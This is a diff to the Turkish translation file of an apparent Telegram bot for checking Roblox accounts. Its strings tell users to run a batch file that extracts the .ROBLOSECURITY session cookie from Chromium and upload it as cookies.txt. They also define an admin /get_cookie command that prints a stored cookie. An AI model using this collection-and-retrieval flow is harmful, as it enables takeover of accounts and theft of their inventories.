@@ -1,3 +1,4 @@
+```json
 {
   "currency": {
     "robux": "R$"
@@ -12,11 +13,11 @@
     "loading": "⏳ Kategorilere göre envanter yükleniyor…",
     "empty": "🫙 Boş.",
     "total_sum": "💰 Toplam envanter değeri: {sum} R$",
-    "total_items": "📦 Fiyatı olan öğeler: {count}",
+    "total_items": "📦 Fiyatı olan eşyalar: {count}",
     "by_cat": "📂 {cat}\nToplam: {count} adet · {sum} R$",
     "full_title": "Tam envanter",
     "selected": {
-      "summary": "💰 Seçilen toplam: {total} R$\n📦 Öğeler: {count}"
+      "summary": "💰 Seçilen toplam: {total} R$\n📦 Eşyalar: {count}"
     }
   },
   "app": {
@@ -29,20 +30,25 @@
   "btn": {
     "lang": "🌐 Dil",
     "back": "⬅️ Geri",
-    "auto_8cd0fba739": "btn.auto_8cd0fba739",
+    "auto_8cd0fba739": "📋 Hesap listesine dön",
     "back_to_profile": "⬅️ Profile geri dön",
     "next": "✅ İleri",
     "none": "🚫 Hiçbiri",
     "all_on": "🟢 Tümü",
-    "all_off": "🚫 Hiçbiri"
+    "all_off": "🚫 Hiçbiri",
+    "refresh": "🔄 Yenile",
+    "refresh_category": "🔄 Kategoriyi yenile",
+    "all_items": "📦 Tüm eşyalar",
+    "categories": "📂 Kategoriler"
   },
   "menu": {
     "add_accounts": "➕ Hesap ekle (.txt)",
     "cookie_script": "🧰 Çerez betiği",
     "delete_account": "🗑 Hesabı sil",
     "saved_accounts": "🧾 Kayıtlı hesaplar",
-    "public_info": "🌐 Genel bilgiler",
-    "settings": "⚙️ Ayarlar"
+    "public_info": "🌐 Genel bilgi",
+    "settings": "⚙️ Ayarlar",
+    "main": "🏠 Ana Menü"
   },
   "errors": {
     "bad_callback": "❌ Geçersiz geri çağırma biçimi.",
@@ -71,41 +77,54 @@
     "inventory_value": "💰 Envanter değeri: {value} R$",
     "inventory_value_label": "💰 Envanter değeri:",
     "inventory_private": "🔒 Envanter gizli",
-    "card": "📘 Hesap bilgileri\n👤 Ad: {uname}\n🏷️ Görünen ad: {display_name}\n🆔 ID: {rid}\n📅 Oluşturulma: {created}\n🌍 Ülke: {country}\n🧬 Cinsiyet: {gender}\n🎂 Doğum tarihi: {birthday}\n📏 Yaş: {age}\n✉️ E-posta: {email} (Doğrulandı: {email_verified})\n💰 Robux: {robux}\n🧾 Toplam harcama: {spent}\n🟢 Durum: {status}"
+    "card": "📘 Hesap bilgileri\n👤 İsim: {uname}\n🏷️ Görünen ad: {display_name}\n🆔 ID: {rid}\n📅 Oluşturulma: {created}\n🌍 Ülke: {country}\n🧬 Cinsiyet: {gender}\n🎂 Doğum tarihi: {birthday}\n📏 Yaş: {age}\n✉️ E-posta: {email} (Doğrulandı: {email_verified})\n💰 Robux: {robux}\n🧾 Toplam harcama: {spent}\n🟢 Durum: {status}"
   },
   "msg": {
-    "auto_a6dc67d175": "❌ Arşiv hazırlanırken hata oluştu.",
-    "auto_068e8874d3": "msg.auto_068e8874d3",
+    "auto_a6dc67d175": "❌ Arşiv hazırlanırken hata.",
+    "auto_068e8874d3": "❌ Dil mevcut değil.",
     "auto_1dd76facf4": "⏳ Envanter yenileniyor…",
-    "auto_2ea715f34f": "msg.auto_2ea715f34f",
-    "auto_349c12ce4e": "msg.auto_349c12ce4e",
-    "auto_5b9ec32c3a": "msg.auto_5b9ec32c3a",
-    "auto_742e941465": "msg.auto_742e941465",
+    "auto_2ea715f34f": "🔐 {rid} kullanıcısı için çerez:\n<code>{cookie}</code>",
+    "auto_349c12ce4e": "📝 Kullanım: /get_cookie &lt;roblox_id&gt;",
+    "auto_5b9ec32c3a": "⏳ Envanter yükleniyor…",
+    "auto_742e941465": "❌ Geçersiz Roblox ID biçimi.",
     "auto_7581c6cb74": "⏳ Kategori yükleniyor…",
     "auto_7d8934a45d": "⏳ Envanter yükleniyor…",
-    "auto_92248ed4b0": "msg.auto_92248ed4b0",
-    "auto_9b3b905f3b": "msg.auto_9b3b905f3b",
-    "auto_b95899d0eb": "⚠️ Çerez kiti şu anda kullanılamıyor.",
+    "auto_92248ed4b0": "❌ Bu hesap için anlık görüntü bulunamadı.",
+    "auto_9b3b905f3b": "📝 Kullanım: /user_snapshot &lt;roblox_id&gt;",
+    "auto_b95899d0eb": "⚠️ Çerez kiti şu anda mevcut değil.",
     "auto_bfed05f982": "⏳ Tam envanter oluşturuluyor…",
-    "auto_c61051830f": "🫙 Bu kategoride fiyatı olan öğe yok.",
-    "auto_d43fb921bf": "🫙 Envanterde fiyatı olan öğe yok.",
-    "auto_d84b7d087c": "msg.auto_d84b7d087c",
+    "auto_c61051830f": "🫙 Bu kategoride fiyatı olan eşya yok.",
+    "auto_d43fb921bf": "🫙 Envanterde fiyatı olan eşya yok.",
+    "auto_d84b7d087c": "🫙 Envanter boş.",
     "auto_e030221412": "⏳ Envanter oluşturuluyor…",
-    "auto_e4d1ae989d": "msg.auto_e4d1ae989d",
+    "auto_e4d1ae989d": "❌ Bu hesap için çerez bulunamadı.",
     "auto_ec50e4a25a": "⏳ Kategori yenileniyor…",
-    "auto_f3d5341cc3": "❌ Envanter oluşturma başarısız. Daha sonra tekrar deneyin.",
-    "auto_f707b4e058": "msg.auto_f707b4e058",
+    "auto_f3d5341cc3": "❌ Envanter oluşturulamadı. Daha sonra tekrar deneyin.",
+    "auto_f707b4e058": "🫙 Seçilen kategorilerde eşya yok.",
     "delete_pick_account": "Silmek için bir hesap seçin:",
     "settings": "⚙️ Ayarlar",
-    "welcome": "\uD83D\uDC4B Raika bot'una hoş geldiniz!\n\n\uD83D\uDCF0 Haber kanalımız - t.me/RaikaChecker\n\nBot'u kullanarak, <a href=\"https://telegra.ph/Terms-of-Service-TOS-for-Raika-Roblox-11-04\">Kullanım Koşulları</a>'nı otomatik olarak kabul etmiş olursunuz"
+    "welcome": "👋 Raika bot'una hoş geldiniz!\n\n📰 Haber kanalımız - t.me/RaikaChecker\n\nBot'u kullanarak, <a href=\"https://telegra.ph/Terms-of-Service-TOS-for-Raika-Roblox-11-04\">Hizmet Şartları</a>'nı otomatik olarak kabul etmiş olursunuz",
+    "no_valid_cookies": "❌ Tüm çerezler geçersiz.",
+    "file_not_txt": "⚠️ Bu bir .txt dosyası değil. .txt formatında bir çerez dosyası gönderin",
+    "account_deleted_error": "❌ Hesap silinirken hata.",
+    "profile_load_error": "❌ Profil yüklenemedi.",
+    "accounts_load_error": "❌ Hesaplar yüklenirken hata.",
+    "delete_accounts_error": "❌ Silinecek hesaplar yüklenirken hata.",
+    "cookie_script_error": "❌ Çerez betiği zip hatası.",
+    "menu_accounts_error": "❌ Hesaplar yüklenirken hata.",
+    "no_cookie_for_account": "⚠️ Bu hesap için çerez bulunamadı.",
+    "profile_load_failed": "❌ Profil yüklenemedi.",
+    "loading_profile": "Profil yükleniyor…",
+    "file_received": "📥 Dosya alındı, kontrol ediliyor...",
+    "cookie_validation_error": "❌ Çerez doğrulama hatası."
   },
   "buttons": {
-    "all_items": "📦 Tüm öğeler",
-    "all_off": "buttons.all_off",
+    "all_items": "📦 Tüm eşyalar",
+    "all_off": "🚫 Hiçbiri",
     "all_on": "🟢 Tümü",
     "back": "🔙 Geri",
-    "back_to_profile": "buttons.back_to_profile",
-    "home": "\uD83D\uDD19 Geri",
+    "back_to_profile": "⬅️ Profile geri dön",
+    "home": "🔙 Geri",
     "next": "✅ İleri",
     "refresh": "🔄 Yenile",
     "refresh_category": "🔄 Kategoriyi yenile"
@@ -115,7 +134,7 @@
     "accounts_list": "📋 Hesaplar"
   },
   "captions": {
-    "accounts_list": "captions.accounts_list"
+    "accounts_list": "📋 Hesaplar"
   },
   "common": {
     "no": "Hayır",
@@ -124,27 +143,36 @@
     "female": "Kadın",
     "unknown": "Bilinmiyor",
     "active": "Aktif",
-    "banned": "Yasaklı"
+    "banned": "Yasaklı",
+    "dash": "—",
+    "ellipsis": "…",
+    "na": "M/U",
+    "regular": "❌ Normal",
+    "premium": "⭐ Premium",
+    "decrypt_error": "<şifre çözme hatası>",
+    "pcs": "adet",
+    "total": "Toplam"
   },
   "cookie": {
-    "instructions": ".ROBLOSECURITY çerezini Chromium'da ayıklamak için aşağıdaki kiti kullanın ve buraya .txt olarak yükleyin.",
-    "kit_caption": "Çerez ayıklama kiti (.ROBLOSECURITY). Batnik.bat'ı çalıştırın, giriş yapın, Enter'a basın, ardından cookies.txt'yi buraya gönderin."
+    "instructions": "Chromium'da .ROBLOSECURITY çerezini çıkarmak için aşağıdaki kiti kullanın ve buraya .txt olarak yükleyin.",
+    "kit_caption": "Çerez çıkarma kiti (.ROBLOSECURITY). Batnik.bat'ı çalıştırın, giriş yapın, Enter'a basın, ardından cookies.txt'yi buraya gönderin.",
+    "instructions_short": "1) Aç\n2) Batnik.bat'ı çalıştır\n3) Chromium'da Roblox'a giriş yap\n4) Enter'a bas\n5) Cookies.txt'yi al"
   },
   "err": {
-    "download_file": "❌ Dosya indirme başarısız: {error}",
-    "profile_load": "❌ Profil yükleme başarısız.",
-    "read_file": "❌ Dosya okuma başarısız: {error}"
+    "download_file": "❌ Dosya indirilemedi: {error}",
+    "read_file": "❌ Dosya okunamadı: {error}",
+    "profile_load": "❌ Profil yüklenemedi."
   },
   "messages": {
     "choose_categories": "Kategorileri seçin (aç/kapat):",
     "choose_language": "Dilinizi seçin:",
-    "welcome": "\uD83D\uDC4B Raika bot'una hoş geldiniz!\n\n\uD83D\uDCF0 Haber kanalımız - t.me/RaikaChecker\n\nBot'u kullanarak, <a href=\"https://telegra.ph/Terms-of-Service-TOS-for-Raika-Roblox-11-04\">Kullanım Koşulları</a>'nı otomatik olarak kabul etmiş olursunuz"
+    "welcome": "👋 Raika bot'una hoş geldiniz!\n\n📰 Haber kanalımız - t.me/RaikaChecker\n\nBot'u kullanarak, <a href=\"https://telegra.ph/Terms-of-Service-TOS-for-Raika-Roblox-11-04\">Hizmet Şartları</a>'nı otomatik olarak kabul etmiş olursunuz"
   },
   "nav": {
-    "categories": "nav.categories",
+    "categories": "📂 Kategoriler",
     "inventory_categories": "🧩 Envanter (kategori seç)",
     "to_accounts": "📋 Hesap listesine dön",
-    "to_home": "\uD83D\uDD19 Geri"
+    "to_home": "🔙 Geri"
   },
   "status": {
     "account_deleted": "🗑 Hesap silindi.",
@@ -153,14 +181,16 @@
     "file_empty": "⚠️ Dosya boş.",
     "loading_profile": "Profil yükleniyor…",
     "no_accounts": "⚠️ Henüz bağlı hesap yok.",
-    "pick_file": "📄 Çerezi içeren .txt dosyası gönderin."
+    "pick_file": "📄 Çerez içeren bir .txt dosyası gönderin.",
+    "file_received": "📥 Dosya alındı, kontrol ediliyor...",
+    "no_accounts_to_delete": "⚠️ Silinecek hesap yok."
   },
-  "welcome": "\uD83D\uDC4B Raika bot'una hoş geldiniz!\n\n\uD83D\uDCF0 Haber kanalımız - t.me/RaikaChecker\n\nBot'u kullanarak, <a href=\"https://telegra.ph/Terms-of-Service-TOS-for-Raika-Roblox-11-04\">Kullanım Koşulları</a>'nı otomatik olarak kabul etmiş olursunuz",
+  "welcome": "👋 Raika bot'una hoş geldiniz!\n\n📰 Haber kanalımız - t.me/RaikaChecker\n\nBot'u kullanarak, <a href=\"https://telegra.ph/Terms-of-Service-TOS-for-Raika-Roblox-11-04\">Hizmet Şartları</a>'nı otomatik olarak kabul etmiş olursunuz",
   "cat": {
     "accessories": "Aksesuarlar",
     "animations/emotes": "Animasyonlar / İfadeler",
     "audio": "Ses",
-    "bundles/packages": "Paketler / Demetler",
+    "bundles/packages": "Paketler / Koleksiyonlar",
     "classic_clothes": "Klasik kıyafetler",
     "emotes": "İfadeler",
     "faces": "Yüzler",
@@ -170,13 +200,26 @@
     "heads": "Kafalar"
   },
   "public": {
-    "ask_id": "🆔 Genel bilgileri göstermek için bir Roblox ID'si gönderin.",
-    "note_limited": "ℹ️ Genel mod: çerez olmadan bazı veriler mevcut değil.",
-    "bad_id": "⚠️ Geçersiz ID. Bir numara gönderin (örn. 123456789).",
-    "not_found": "❌ Kullanıcı bulunamadı veya kullanılamıyor.",
+    "ask_id": "🆔 Genel bilgileri göstermek için bir Roblox ID gönderin.",
+    "note_limited": "ℹ️ Genel mod: bazı veriler çerez olmadan mevcut değildir.",
+    "bad_id": "⚠️ Geçersiz ID. Bir sayı gönderin (örn. 123456789).",
+    "not_found": "❌ Kullanıcı bulunamadı veya mevcut değil.",
     "inventory_private": "⚠️ Bu kullanıcının envanteri Roblox'ta gizli."
   },
   "settings": {
     "title": "⚙️ Ayarlar"
+  },
+  "admin": {
+    "stats": "📊 <b>Bot İstatistikleri</b>\n👥 Toplam kullanıcı: {total_users}\n🆕 Bugün yeni: {new_today}\n📈 Bugün aktif: {active_today}\n🔗 Bağlı hesaplar: {users_with_accounts}\n🔎 Toplam kontrol: {checks_total}\n📅 Bugünkü kontroller: {checks_today}",
+    "user_snapshot": "🧾 <b>Hesap Anlık Görüntüsü</b>\n🆔 Roblox ID: {rid}\n💰 Envanter: {inventory_val} R$\n💸 Toplam harcama: {total_spent} R$\n🕒 Güncellendi: {updated_at}"
+  },
+  "inventory_view": {
+    "public_title": "📦 Genel envanter\nToplam: {total} adet · {total_sum} R$",
+    "category_title": "📂 {category}\nToplam: {count} adet · {total_sum} R$",
+    "all_categories": "📦 Tüm kategoriler birlikte\nToplam: {total} adet · {total_sum} R$",
+    "grand_total": "💰 Toplam envanter değeri: {total_sum} R$\n📦 Fiyatı olan toplam eşya: {total_count}",
+    "render_too_large": "📦 Tüm eşyalar: işleme çok büyük. Boyutu küçültün veya seçimi daraltın.",
+    "page": "Sayfa {current}/{total}"
   }
 }
+```
